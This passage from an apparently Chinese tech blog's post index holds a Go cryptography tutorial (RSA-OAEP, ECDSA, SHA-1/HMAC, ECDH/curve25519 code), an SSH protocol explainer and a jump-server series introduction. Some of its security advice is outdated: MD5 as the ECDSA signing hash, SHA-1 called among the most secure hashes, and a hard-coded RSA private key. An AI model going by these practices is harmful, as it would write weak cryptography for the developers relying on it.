pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes) if err != nil &#123; panic(err) &#125; pub := pubKeyValue.(*rsa.PublicKey) // 加密数据方法: 不用使用EncryptPKCS1v15方法加密,源码里面推荐使用EncryptOAEP, 因此这里使用安全的方法加密 encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, nil) if err != nil &#123; panic(err) &#125; cipherByte = encryptOAEP return&#125;// 使用私钥解密公钥加密的数据func decrypt(cipherByte []byte, privateKey string) (plainText string, err error) &#123; // 解析出私钥 priBlock, _ := pem.Decode([]byte(privateKey)) priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes) if err != nil &#123; panic(err) &#125; // 解密RSA-OAEP方式加密后的内容 decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, nil) if err != nil &#123; panic(err) &#125; plainText = string(decryptOAEP) return&#125;func test() &#123; msg := "Content bo be encrypted!" // 获取公钥, 生产环境往往是文件中读取, 这里为了测试方便, 直接生成了. publicKeyData := `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB-----END PUBLIC KEY-----` // 获取私钥 privateKeyData := `-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQABAoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaMZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI89KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrwDPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWOAQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O-----END RSA PRIVATE KEY-----` cipherData, err := encrypt(msg, publicKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("encrypt message: %x\n", cipherData) plainData, err := decrypt(cipherData, privateKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("decrypt message:%s\n", plainData)&#125;func main() &#123; test()&#125; ecdsa正在逐渐成为数字签名的一个标准, 在golang的ssh库中就是使用这个算法来签名的: A使用自己的私钥签名一段数据, 然后将公钥发放出去. 用户拿到公钥后, 验证数据的签名,如果通过则证明数据来源是A, 从而达到身份认证的作用.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "crypto/ecdsa" "crypto/elliptic" "crypto/md5" "crypto/rand" "fmt" "hash" "io" "math/big")// SignData 用于保存签名的数据type SignData struct &#123; r *big.Int s *big.Int signhash *[]byte signature *[]byte&#125;// 使用私钥签名一段数据func sign(message string, privateKey *ecdsa.PrivateKey) (signData *SignData, err error) &#123; // 签名数据 var h hash.Hash h = md5.New() r := big.NewInt(0) s := big.NewInt(0) io.WriteString(h, message) signhash := h.Sum(nil) r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash) if serr != nil &#123; return nil, serr &#125; signature := r.Bytes() signature = append(signature, s.Bytes()...) signData = &amp;SignData&#123; r: r, s: s, signhash: &amp;signhash, signature: &amp;signature, &#125; return&#125;// 校验数字签名func verifySign(signData *SignData, publicKey *ecdsa.PublicKey) (status bool) &#123; status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s) return&#125;func test() &#123; //使用椭圆曲线的P256算法,现在一共也就实现了4种,我们使用折中一种,具体见http://golang.org/pkg/crypto/elliptic/#P256 pubkeyCurve := elliptic.P256() privateKey := new(ecdsa.PrivateKey) // 生成秘钥对 privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader) if err != nil &#123; panic(err) &#125; var publicKey ecdsa.PublicKey publicKey = privateKey.PublicKey // 签名 signData, err := sign("This is a message to be signed and verified by ECDSA!", privateKey) if err != nil &#123; panic(err) &#125; fmt.Printf("The signhash: %x\nThe signature: %x\n", *signData.signhash, *signData.signature) // 验证 status := verifySign(signData, &amp;publicKey) fmt.Printf("The verify result is: %v\n", status)&#125;func main() &#123; test()&#125; 散列算法散列是信息的提炼，通常其长度要比信息小得多，且为一个固定长度。加密性强的散列一定是不可逆的，这就意味着通过散列结果，无法推出任何部分的原始信息。任何输入信息的变化，哪怕仅一位，都将导致散列结果的明显变化，这称之为雪崩效应。散列还应该是防冲突的，即找不出具有相同散列结果的两条信息。具有这些特性的散列结果就可以用于验证信息是否被修改。常用于保证数据完整性单向散列函数一般用于产生消息摘要，密钥加密等，常见的有： MD5(Message Digest Algorithm 5): 是RSA数据安全公司开发的一种单向散列算法。 SHA(Secure Hash Algorithm): 可以对任意长度的数据运算生成一个160位的数值； MD5MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。将数据（如汉字）运算为另一固定长度值，是杂凑算法的基础原理，MD5的前身有MD2、MD3和MD4 SHA-1在1993年，安全散列算法（SHA）由美国国家标准和技术协会(NIST)提出，并作为联邦信息处理标准（FIPS PUB 180）公布；1995年又发布了一个修订版FIPS PUB 180-1，通常称之为SHA-1。SHA-1是基于MD4算法的，并且它的设计在很大程度上是模仿MD4的。现在已成为公认的最安全的散列算法之一，并被广泛使用。SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。该算法输入报文的最大长度不超过264位，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。sha1是SHA家族的五个算法之一(其它四个是SHA-224、SHA-256、SHA-384，和SHA-512) HMacHmac算法也是一种哈希算法，它可以利用MD5或SHA1等哈希算法。不同的是，Hmac还需要一个密钥, 只要密钥发生了变化，那么同样的输入数据也会得到不同的签名，因此，可以把Hmac理解为用随机数“增强”的哈希算法。 SHA-1与MD5的比较因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同： 对强行供给的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。 对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。 速度：在相同的硬件上，SHA-1的运行速度比MD5慢。 代码示例由于MD5已经被破解了(中国山东大学的王小云教授破解), 常用的散列算法是sha家族, 更加安全的算法是使用Hmac123456789101112131415161718192021222324252627282930313233343536package mainimport ( "crypto/hmac" "crypto/sha1" "fmt" "io")// sha1散列算法func sha1Hash(msg string) (hashData []byte) &#123; h := sha1.New() io.WriteString(h, msg) hashData = h.Sum(nil) return&#125;// 使用sha1的Hmac散列算法func hmacHash(msg string, key string) (hashData []byte) &#123; k := []byte(key) mac := hmac.New(sha1.New, k) io.WriteString(mac, msg) hashData = mac.Sum(nil) return&#125;func main() &#123; msg := "This is the message to hash!" // sha1 sha1Data := sha1Hash(msg) fmt.Printf("SHA1: %x\n", sha1Data) // hmac hmacData := hmacHash(msg, "The key string!") fmt.Printf("HMAC: %x\n", hmacData)&#125; 秘钥交换算法一种密钥交换协议，注意该算法只能用于密钥的交换，而不能进行消息的加密和解密。双方确定要用的密钥后，要使用其他对称密钥操作加密算法实际加密和解密消息。它可以让双方在不泄漏密钥的情况下协商出一个密钥来, 常用于保证对称加密的秘钥的安全, TLS就是这样做的。在这个领域应该2种 DH：ECDH是DH的加强版 ECDH: DH算法的加强版, 常用的是NIST系列,但是后面curve25519 curve25519: 实质上也是一种ECDH,但是其实现更为优秀,表现的更为安全,可能是下一代秘钥交换算法的标准。 DHDH全称是:Diffie-Hellman, 是一种确保共享KEY安全穿越不安全网络的方法，它是OAKLEY的一个组成部分。Whitefield与Martin Hellman在1976年提出了一个奇妙的密钥交换协议，称为Diffie-Hellman密钥交换协议/算法(Diffie-Hellman Key Exchange/Agreement Algorithm).这个机制的巧妙在于需要安全通信的双方可以用这个方法确定对称密钥。然后可以用这个密钥进行加密和解密。DH依赖于计算离散对数的难度, 大概过程如下: 可以如下定义离散对数：首先定义一个素数p的原根，为其各次幂产生从1 到p-1的所有整数根，也就是说，如果a是素数p的一个原根，那么数值 a mod p,a2 mod p,…,ap-1 mod p 是各不相同的整数，并且以某种排列方式组成了从1到p-1的所有整数. 对于一个整数b和素数p的一个原根a，可以找到惟一的指数i，使得 b = a^i mod p 其中0 ≤ i ≤ （p-1） 指数i称为b的以a为基数的模p的离散对数或者指数.该值被记为inda,p(b). ECDH全称是Elliptic Curve Diffie-Hellman, 是DH算法的加强版, 基于椭圆曲线难题加密, 现在是主流的密钥交换算法。ECC是建立在基于椭圆曲线的离散对数的难度, 大概过程如下: 给定椭圆曲线上的一个点P，一个整数k，求解Q=kP很容易；给定一个点P、Q，知道Q=kP，求整数k确是一个难题。ECDH即建立在此数学难题之上 椭圆曲线算法因参数不同有多种类型, 这个网站列出了现阶段那些ECC是相对安全的:椭圆曲线算法安全列表, 而curve25519便是其中的佼佼者。Curve25519/Ed25519/X25519是著名密码学家Daniel J. Bernstein在2006年独立设计的椭圆曲线加密/签名/密钥交换算法, 和现有的任何椭圆曲线算法都完全独立。特点是： 完全开放设计: 算法各参数的选择直截了当，非常明确，没有任何可疑之处，相比之下目前广泛使用的椭圆曲线是NIST系列标准，方程的系数是使用来历不明的随机种子 c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 生成的，非常可疑，疑似后门； 高安全性： 一个椭圆曲线加密算法就算在数学上是安全的，在实用上也并不一定安全，有很大的概率通过缓存、时间、恶意输入摧毁安全性，而25519系列椭圆曲线经过特别设计，尽可能的将出错的概率降到了最低，可以说是实践上最安全的加密算法。例如，任何一个32位随机数都是一个合法的X25519公钥，因此通过恶意数值攻击是不可能的，算法在设计的时候刻意避免的某些分支操作，这样在编程的时候可以不使用if ，减少了不同if分支代码执行时间不同的时序攻击概率，相反， NIST系列椭圆曲线算法在实际应用中出错的可能性非常大，而且对于某些理论攻击的免疫能力不高， Bernstein 对市面上所有的加密算法使用12个标准进行了考察， 25519是几乎唯一满足这些标准的 http://t.cn/RMGmi1g ； 速度快: 25519系列曲线是目前最快的椭圆曲线加密算法，性能远远超过NIST系列，而且具有比P-256更高的安全性； 作者功底深厚: Daniel J. Bernstein是世界著名的密码学家，他在大学曾经开设过一门 UNIX 系统安全的课程给学生，结果一学期下来，发现了 UNIX 程序中的 91 个安全漏洞；他早年在美国依然禁止出口加密算法时，曾因为把自己设计的加密算法发布到网上遭到了美国政府的起诉，他本人抗争六年，最后美国政府撤销所有指控，目前另一个非常火的高性能安全流密码 ChaCha20 也是出自 Bernstein 之手； 下一代的标准: 25519系列曲线自2006年发表以来，除了学术界无人问津， 2013 年爱德华·斯诺登曝光棱镜计划后，该算法突然大火，大量软件，如OpenSSH都迅速增加了对25519系列的支持，如今25519已经是大势所趋，可疑的NIST曲线迟早要退出椭圆曲线的历史舞台，目前， RFC增加了SSL/TLS对X25519密钥交换协议的支持，而新版 OpenSSL 1.1也加入支持，是摆脱老大哥的第一步，下一步是将 Ed25519做为可选的TLS证书签名算法，彻底摆脱NIST 代码示例这里需要指出下golang的标准库的crypto里的椭圆曲线实现了这4种(elliptic文档): P224/P256/P384/P521, 而curve25519是单独实现的, 他不在标准库中: golang.org/x/crypto/curve25519123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212package mainimport ( "crypto" "crypto/elliptic" "crypto/rand" "fmt" "io" "math/big" "golang.org/x/crypto/curve25519")// ECDH 秘钥交换算法的主接口type ECDH interface &#123; GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) Marshal(crypto.PublicKey) []byte Unmarshal([]byte) (crypto.PublicKey, bool) GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]byte, error)&#125;type ellipticECDH struct &#123; ECDH curve elliptic.Curve&#125;type ellipticPublicKey struct &#123; elliptic.Curve X, Y *big.Int&#125;type ellipticPrivateKey struct &#123; D []byte&#125;// NewEllipticECDH 指定一种椭圆曲线算法用于创建一个ECDH的实例// 关于椭圆曲线算法标准库里面实现了4种: 见crypto/ellipticfunc NewEllipticECDH(curve elliptic.Curve) ECDH &#123; return &amp;ellipticECDH&#123; curve: curve, &#125;&#125;// GenerateKey 基于标准库的NIST椭圆曲线算法生成秘钥对func (e *ellipticECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var d []byte var x, y *big.Int var priv *ellipticPrivateKey var pub *ellipticPublicKey var err error d, x, y, err = elliptic.GenerateKey(e.curve, rand) if err != nil &#123; return nil, nil, err &#125; priv = &amp;ellipticPrivateKey&#123; D: d, &#125; pub = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return priv, pub, nil&#125;// Marshal用于公钥的序列化func (e *ellipticECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*ellipticPublicKey) return elliptic.Marshal(e.curve, pub.X, pub.Y)&#125;// Unmarshal用于公钥的反序列化func (e *ellipticECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var key *ellipticPublicKey var x, y *big.Int x, y = elliptic.Unmarshal(e.curve, data) if x == nil || y == nil &#123; return key, false &#125; key = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return key, true&#125;// GenerateSharedSecret 通过自己的私钥和对方的公钥协商一个共享密码func (e *ellipticECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; priv := privKey.(*ellipticPrivateKey) pub := pubKey.(*ellipticPublicKey) x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D) return x.Bytes(), nil&#125;// NewCurve25519ECDH 使用密码学家Daniel J. Bernstein的椭圆曲线算法:Curve25519来创建ECDH实例// 因为Curve25519独立于NIST之外, 没在标准库实现, 需要单独为期实现一套接口来支持ECDHfunc NewCurve25519ECDH() ECDH &#123; return &amp;curve25519ECDH&#123;&#125;&#125;type curve25519ECDH struct &#123; ECDH&#125;// GenerateKey 基于curve25519椭圆曲线算法生成秘钥对func (e *curve25519ECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var pub, priv [32]byte var err error _, err = io.ReadFull(rand, priv[:]) if err != nil &#123; return nil, nil, err &#125; priv[0] &amp;= 248 priv[31] &amp;= 127 priv[31] |= 64 curve25519.ScalarBaseMult(&amp;pub, &amp;priv) return &amp;priv, &amp;pub, nil&#125;// 实现公钥的序列化func (e *curve25519ECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*[32]byte) return pub[:]&#125;// 实现公钥的反序列化func (e *curve25519ECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var pub [32]byte if len(data) != 32 &#123; return nil, false &#125; copy(pub[:], data) return &amp;pub, true&#125;// 实现秘钥协商接口func (e *curve25519ECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; var priv, pub, secret *[32]byte priv = privKey.(*[32]byte) pub = pubKey.(*[32]byte) secret = new([32]byte) curve25519.ScalarMult(secret, priv, pub) return secret[:], nil&#125;func test(e ECDH) &#123; var privKey1, privKey2 crypto.PrivateKey var pubKey1, pubKey2 crypto.PublicKey var pubKey1Buf, pubKey2Buf []byte var err error var ok bool var secret1, secret2 []byte // 准备2对秘钥对,A: privKey1,pubKey1 B:privKey2,pubKey2 privKey1, pubKey1, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; privKey2, pubKey2, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; pubKey1Buf = e.Marshal(pubKey1) pubKey2Buf = e.Marshal(pubKey2) pubKey1, ok = e.Unmarshal(pubKey1Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; pubKey2, ok = e.Unmarshal(pubKey2Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; // A 通过B给的公钥协商共享密码 secret1, err = e.GenerateSharedSecret(privKey1, pubKey2) if err != nil &#123; fmt.Println(err) &#125; // B 通过A给的公钥协商共享密码 secret2, err = e.GenerateSharedSecret(privKey2, pubKey1) if err != nil &#123; fmt.Println(err) &#125; // A B在没暴露直接的私钥的情况下, 协商出了一个共享密码 fmt.Printf("The secret1 shared keys: %x\n", secret1) fmt.Printf("The secret2 shared keys: %x\n", secret2)&#125;func main() &#123; e1 := NewEllipticECDH(elliptic.P521()) e2 := NewCurve25519ECDH() test(e1) test(e2)&#125; 总体结论以上综述了两种加密方法的原理，总体来说主要有下面几个方面的不同： 管理方面：公钥密码算法只需要较少的资源就可以实现目的，在密钥的分配上，两者之间相差一个指数级别（一个是n一个是n2）。所以私钥密码算法不适应广域网的使用，而且更重要的一点是它不支持数字签名。 安全方面：由于公钥密码算法基于未解决的数学难题，在破解上几乎不可能。对于私钥密码算法，到了AES虽说从理论来说是不可能破解的，但从计算机的发展角度来看。公钥更具有优越性。 速度上来看：AES的软件实现速度已经达到了每秒数兆或数十兆比特。是公钥的100倍，如果用硬件来实现的话这个比值将扩大到1000倍。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跳板机系列(二)-ssh协议原理简介]]></title>
    <url>%2F2017%2F02%2F16%2Fssh-protocol%2F</url>
    <content type="text"><![CDATA[SSH对于大多数人来说应该并不陌生, 无论你是开发还是测试还是运维, 只要你需要登录类Unix服务器都会用到, 他被用来提供链接的安全保障, 比如常见的客户端有命令行工具ssh, 以及周边的商业工具Xshell等。在这篇文章里我们不会教你如何使用xshell, 而是从协议层面全新的认识下ssh。 背景虽然SSH使用起来很简单, 但是背后的原理特别不简单,关于以下问题, 你能否知晓其细节: SSH如何保证客户端与服务端通行的安全 SSH采用什么加密协议 SSH是通过对称加密还是非对称加密数据在传输过程的安全 SSH如何保证数据完整性 SSH的密码认证方式和密钥认证方式分别如何实现，有何差异 简介SSH全称Secure Shell是一种工作在应用层和传输层上的安全协议，能在非安全通道上建立安全通道。提供身份认证、密钥更新、数据校验、通道复用等功能，同时具有良好的可扩展性,由芬兰赫尔辛基大学研究员Tatu Ylönen,于1995年提出，其目的是用于替代非安全的Telnet、rsh、rexec等远程Shell协议。之后SSH发展了两个大版本,SSH-1和SSH-2, 开源实现OpenSSH对2者都支持。SSH的主要特性: 加密: 避免数据内容泄漏 通信的完整性: 避免数据被篡改，以及发送或接受地址伪装(检查数据是否被篡改，数据是否来自发送者而非攻击者） SSH-2通过MD5和SHA-1实现该功能，SSH-1使用CRC-32 认证: 识别数据发送者和接收者身份 客户端验证SSH服务端的身份：防止攻击者仿冒SSH服务端身份，避免中介人攻击和重定向请求的攻击；OpenSSH通过在know-hosts中存储主机名和host key对服务端身份进行认证 服务端验证请求者身份：提供安全性较弱的用户密码方式，和安全性更强的per-user public-key signatures；此外SSH还支持与第三方安全服务系统的集成，如Kerberos等 授权: 用户访问控制 安全隧道: 转发或者为基于TCP/IP的回话提供加密隧道, 比如通过SSH为Telnet、FTP等提供通信安全保障，支持三种类型的Forwarding操作：Port Forwarding；X Forwarding；Agent Forwarding 通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。 安全相关在SSH中涉及到很多加密算法, 关于加密算法的相关知识之前已经写过一遍博客做专门介绍:密码学简介与Golang的加密库Crypto的使用, 以下是一个总结性的描述: 对称加密: 高效，但安全性相对较低，Key的分发尤其不方便, 主要用于数据传输的加密(session加密), 常用AES系列 非对称加密: 安全，但效率低，不适合大规模进行数据的加密和解密操作, 主要用于秘钥交换算法过程中用来协商Key和在数字签名时用来验证身份, 常用的是RSA/ECDSA 秘钥交换算法: 用于协商对称加密的密码, ECDH用的比较多 散列算法: 用于确保数据传输过程中的完整性, 为了安全一般使用Hmac在golang的ssh包中使用ECDH的cure25519的进行密码的交换, 交换后的密码使用AES来加密数据. 如果使用密钥登录的话,一般使用ECDSA进行数字签名. 协议组成从上图中可以看出SSH主要有三部分组成: 传输层协议, 用户认证协议, 连接协议 传输层协议[SSH-TRANS]也叫:The Transport Layer Protocol, 提供了服务器认证，保密性及完整性。此外它有时还提供压缩功能。 SSH-TRANS通常运行在TCP/IP连接上，也可能用于其它可靠数据流上。 SSH-TRANS提供了强力的加密技术、密码主机认证及完整性保护。该协议中的认证基于主机，并且该协议不执行用户认证。更高层的用户认证协议可以设计为在此协议之上。 用户认证协议[SSH-USERAUTH]也叫:The User Authentication Protocol, 用于向服务器提供客户端用户鉴别功能。它运行在传输层协议SSH-TRANS上面。当SSH-USERAUTH开始后，它从低层协议那里接收会话标识符(从第一次密钥交换中的交换哈希H). 会话标识符唯一标识此会话并且适用于标记以证明私钥的所有权。 SSH-USERAUTH也需要知道低层协议是否提供保密性保护。 连接协议[SSH-CONNECT]也叫: The Connection Protocol, 将多个加密隧道分成逻辑通道。它运行在用户认证协议上。它提供了交互式登录话路、远程命令执行、转发TCP/IP连接和转发X11连接。各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。 工作过程这张图描述了ssh交换的整个过程: Client端向Server端发起SSH连接请求。 Server端向Client端发起版本协商。 协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。 Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。 进入认证阶段。从此以后所有通信均加密。 认证成功后，进入交互阶段。 针对这项阶段发生在协成的那一部分有一个简单的总结: 发生在传输层的: 版本协商和算法协商. 发生在用户认证层的: 用户认证. 发生在链接层的: 回话交互 版本协商 服务器监听22端口，等待客户端连接。 客户端向服务器端发起TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开TCP连接。 因为版本协商发生在为加密之前, 所以版本协商是明文的 算法协商 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC(Message Authentication Code，消息验证码)算法列表、压缩算法列表等; 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。 服务器端和客户端利用ECDH交换算法、主机密钥对等参数，生成会话密钥和会话ID。 通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID, 用于加密传输的数据, 到此链接加密完成。 用户认证 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。 客户端从认证方法列表中选取一种认证方法再次进行认证。 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。 用户认证是在加密过会进行的, 所以用于认证的数据是不会暴露的,通常而言SSH提供2认证方式: password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。 publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息SSH2.0还提供了 password-publickey 认证和 any 认证: password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。 any认证：指定该用户的认证方式可以是 password，也可以是 publickey。 一般而言默认使用的any。这张图描述了在加密过程上的认证: 会话交互会话请求阶段： 服务器等待客户端的请求； 认证通过后，客户端向服务器发送会话请求； 服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。 交互会话阶段，在这个模式下，数据被双向传送: 客户端将要执行的命令加密后传给服务器; 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端; 客户端将接收到的结果解密后显示到终端上.]]></content>
      <categories>
        <category>协议详解</category>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跳板机系列(一)-架构与简介]]></title>
    <url>%2F2017%2F02%2F15%2Fgo-ssh%2F</url>
    <content type="text"><![CDATA[一直参与JumpServer的开发, 也一直在想如何设计一个相对完美的跳板机, 跳板机的本质是ssh协议的反向代理(主要还是ssh, 至于rdp还没想过), 虽然也经常使用ssh(做运维的时候还专门就ssh学习过), 但也仅仅是ssh客户端的使用以及服务端的配置, 我觉得一个完美的跳板机应该是从协议层面解决这个问题。因此打算以Golang为开发语言(因为ssh库完善，websocket编写简单),开发一个有基本功能的跳板机。 概述这一系列的博客 包含很多篇, 主要目的是: 在之前的经验上, 把开发过程中涉及到的所有知识和感想记录下来(当然包含源码), 这一系列涉及如下文章, 由浅入深, 循序渐进的介绍开发过程中涉及到的各种知识: 跳板机系列(一)-架构与简介 跳板机系列(二)-ssh协议原理简介 跳板机系列(三)-Golang中SSH客户端的实现 简单架构之前JumpServer的核心是按照简单的架构来开发的, 一个简单的架构其实已经有很多不错的demo或者产品了, 比如这个项目webconsole, 当然他不完整仅仅实现了web，至于命令行并没有实现, 而jumpserver这2个都实现了。为什么称之为简单的架构, 因为他的核心思想就是: 就是模拟一个终端(web端的xterm这个js库就是干这个事儿的, 而命令行同样模拟一个终端就行了, 比如golang的ssh/terminal这个库就可以完成这个事儿),然后通过一个ssh agent访问后面的真实的服务器，起到一个代理转发的作用。 这种模式的缺陷主要体现在命令行终端上面, 因为此时终端后面接的就是ssh客户端, 因此这个终端是一个客户端和跳板机绑定在一起了, 用户只有先登录跳板机才能使用代理服务, 而这显然是不合理的,Jumpserver在此上进行了改进, 通过再添加一个ssh server监听, 实际上就是ssh-in-ssh。 架构改进改进过后主要加入一个ssh的代理服务,统一代理层, 抽离客户端。 完美架构个人架构的能力还是很菜的, 对ssh协议的理解也不深, 当看到teleport这个开源产品的设计时, 完全被惊呆了。 这不就是我想要的架构嘛, 而且细节是做的那么的漂亮。后期如果有时间的话, 打算写一个关于teleport源码解读的系列, 一点一个剖析这个完美架构的实现。 总结写这一个系列不容易, 这是一个开篇和规划，希望最后能完美的收尾，有一个不错的demo展示给大家。现在看来teleport已经很完善了, 也符合我心目中的跳板机的样子, 等读完teleport源码过后, 看其是否完善, 扩展是否方便, 因此很有可能是完善teleport,而不是从头开始。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs源加速]]></title>
    <url>%2F2017%2F02%2F14%2Fnodejs-accelerate%2F</url>
